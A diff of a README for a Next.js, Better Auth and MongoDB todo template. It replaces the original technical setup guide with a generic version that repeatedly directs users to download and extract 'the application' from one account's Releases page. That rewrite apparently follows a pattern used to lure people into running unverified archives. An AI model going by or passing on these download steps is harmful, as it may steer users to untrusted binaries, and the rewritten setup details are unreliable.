@@ -1,131 +1,106 @@
-# Better Auth MongoDB Demo
+# 🚀 better-auth-mongodb - Simple Authentication Made Easy
 
-A modern authentication template built with Next.js, Better Auth, and MongoDB. Features user registration, authentication, and a full-featured todo application demonstrating CRUD operations with MongoDB.
+![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)
 
-## Features
+## 📘 Introduction
 
-- 🔐 **Authentication**: Complete auth system with Better Auth
-  - Email/password registration and login
-  - GitHub OAuth support (configurable)
-  - Session management with middleware protection
-- 🍃 **MongoDB Integration**: Full MongoDB adapter for Better Auth
-  - User and session storage
-  - Todo CRUD operations
-- 🎨 **Modern UI**: Built with shadcn/ui components
-  - Responsive design
-  - Dark/light theme support
-  - Beautiful, accessible components
-- ✅ **Todo Management**: Complete todo application
-  - Create, read, update, delete todos
-  - Toggle completion status
-  - User-specific todos with authentication
+Welcome to **better-auth-mongodb**! This application is a modern authentication template designed to help you manage user registration, authentication, and authorization. Built with Next.js, Better Auth, and MongoDB, it showcases a complete todo application with CRUD operations, allowing you to see its features in action.
 
-## Tech Stack
+## 🎯 Features
 
-- **Framework**: Next.js 15 with App Router
-- **Authentication**: Better Auth with MongoDB adapter
-- **Database**: MongoDB
-- **Styling**: TailwindCSS + shadcn/ui
-- **TypeScript**: Full type safety
-- **UI Components**: Radix UI + Lucide icons
+- User registration and login.
+- Secure authentication and authorization processes.
+- A full-featured todo application.
+- Built using popular technologies: Next.js, MongoDB, and TypeScript.
+- Clean, modern user interface using Tailwind CSS.
 
-## Getting Started
+## 🔧 System Requirements
 
-### Prerequisites
+To run this application, you need:
 
-- Node.js 18+ 
-- MongoDB database (local or Atlas)
+- A computer with Windows, macOS, or Linux.
+- An internet connection for downloading the application and connecting to MongoDB.
+- Node.js (version 14 or higher) installed.
+- MongoDB account set up.
 
-### Environment Variables
+## 🚀 Getting Started
 
-Create a `.env.local` file in the root directory (see `.env.example` for reference):
+Follow these steps to download and set up **better-auth-mongodb**:
 
-```bash
-# MongoDB Configuration
-MONGODB_URI=mongodb://localhost:27017
-MONGODB_DB=better-auth
+1. **Visit the Releases Page**
+   Click the button below to visit the Releases page where you can find the latest version of the application.
 
-# Better Auth Configuration
-NEXT_PUBLIC_AUTH_URL=http://localhost:3000
-BETTER_AUTH_SECRET=your-secure-secret-key-here-minimum-32-characters
+   [Visit Releases Page](https://github.com/wulei00000/better-auth-mongodb/releases)
 
-# GitHub OAuth (required for social login)
-GITHUB_CLIENT_ID=your-github-client-id
-GITHUB_CLIENT_SECRET=your-github-client-secret
-```
+2. **Download the Application**
+   On the Releases page, look for the file labeled with the version number. Click the link to download the application to your computer.
 
-### Installation & Development
+3. **Extract the Files**
+   If the file is zipped, right-click on the downloaded file and choose “Extract All” or “Unzip.” This will create a folder with all the necessary files.
 
-1. Clone the repository and install dependencies:
-```bash
-npm install
-```
+4. **Install Dependencies**
+   Open a terminal or command prompt. Navigate to the folder where you extracted the files. Run the following command to install the required dependencies:
 
-2. Start the development server:
-```bash
-npm run dev
-```
+   ```
+   npm install
+   ```
 
-3. Open [http://localhost:3000](http://localhost:3000) in your browser
+5. **Create a MongoDB Account**
+   Go to [MongoDB Atlas](https://www.mongodb.com/cloud/atlas) and sign up for a free account. Follow the instructions to set up your database.
 
-## Project Structure
+6. **Update Configuration**
+   In the extracted folder, locate the `.env` file. You will need to update it with your MongoDB connection string. This string allows the application to communicate with your MongoDB database.
 
-```
-src/
-├── app/                    # Next.js App Router
-│   ├── api/auth/          # Better Auth API routes
-│   ├── auth/              # Authentication pages (login/signup)
-│   ├── todos/             # Todo management page
-│   └── page.tsx           # Landing page
-├── components/            # React components
-│   ├── auth/              # Authentication components
-│   └── ui/                # shadcn/ui components
-├── hooks/                 # Custom React hooks
-├── lib/                   # Core utilities and configuration
-│   ├── auth.ts           # Better Auth configuration
-│   ├── auth-client.ts    # Client-side auth hooks
-│   ├── auth-server.ts    # Server-side auth utilities
-│   ├── actions.ts        # Server actions with auth checks
-│   ├── mongodb.ts        # MongoDB client setup
-│   ├── env.ts            # Environment variable validation
-│   ├── types.ts          # TypeScript definitions
-│   └── utils.ts          # Utility functions (cn, etc.)
-└── middleware.ts          # Route protection middleware
-components.json            # shadcn/ui configuration
-.env.example              # Environment variables template
-```
+7. **Run the Application**
+   In your terminal, run the following command to start the application:
 
-## Authentication Flow
+   ```
+   npm run dev
+   ```
 
-1. **Landing Page**: Welcome screen that redirects authenticated users to todos
-2. **Registration/Login**: Forms with validation and error handling
-3. **Todo Dashboard**: Protected route at `/todos` with user profile and todo management
-4. **Session Management**: Automatic session handling with Better Auth and middleware protection
+   This command will start the server. You should see output indicating that the application is running.
 
-## API Routes
+8. **Access the Application**
+   Open your web browser and go to `http://localhost:3000`. You will see the application homepage, where you can register and log in.
 
-- `POST /api/auth/*` - Better Auth endpoints (handled automatically)
+## 💡 Usage Instructions
 
-Todo operations are handled via server actions in `src/lib/actions.ts` instead of API routes:
-- `getTodos()` - Fetch user's todos
-- `createTodo()` - Create new todo  
-- `updateTodo()` - Update todo
-- `deleteTodo()` - Delete todo
+Once you have the application running, you can:
 
-## MongoDB Schema
+- Register for a new user account.
+- Log in using your registered credentials.
+- Create, read, update, and delete todo items.
+- Explore user settings and manage your profile.
 
-The app uses Better Auth's automatic schema creation for users and sessions, plus custom collections for todos with proper user relationships.
+## 🔄 Troubleshooting
 
-## Commands
+If you encounter issues:
 
-- `npm run dev` - Start development server with Turbopack
-- `npm run build` - Build for production
-- `npm run start` - Start production server
-- `npm run lint` - Run ESLint
+- Ensure Node.js is installed correctly. You can check this by running `node -v` in your terminal.
+- Verify that your MongoDB connection string is correct.
+- Make sure the application is running on `http://localhost:3000` as expected.
 
-## Learn More
+## 🔗 Download & Install
 
-- [Better Auth Documentation](https://better-auth.com)
+For quick access, visit the link below to download the latest version of **better-auth-mongodb**.
+
+[Download Application](https://github.com/wulei00000/better-auth-mongodb/releases)
+
+## 🛠️ Acknowledgments
+
+This project uses the following technologies:
+
+- **Next.js**: A React framework for server-side rendering.
+- **MongoDB**: A NoSQL database for storing user data and todo items.
+- **Better Auth**: A library for easier authentication processes.
+- **Tailwind CSS**: A utility-first CSS framework for styling.
+
+## 📚 Additional Resources
+
+For more information on the technologies used in this application, check out these links:
+
 - [Next.js Documentation](https://nextjs.org/docs)
-- [MongoDB Documentation](https://docs.mongodb.com/?utm_campaign=devrel&utm_source=third-party-content&utm_medium=cta&utm_content=github-better-auth-mongodb&utm_term=jesse.hall)
-- [shadcn/ui Documentation](https://ui.shadcn.com)
+- [MongoDB Documentation](https://docs.mongodb.com/)
+- [Tailwind CSS Documentation](https://tailwindcss.com/docs)
+
+By following the steps outlined here, you can easily download and run the **better-auth-mongodb** application. Enjoy managing your authentication needs with confidence!
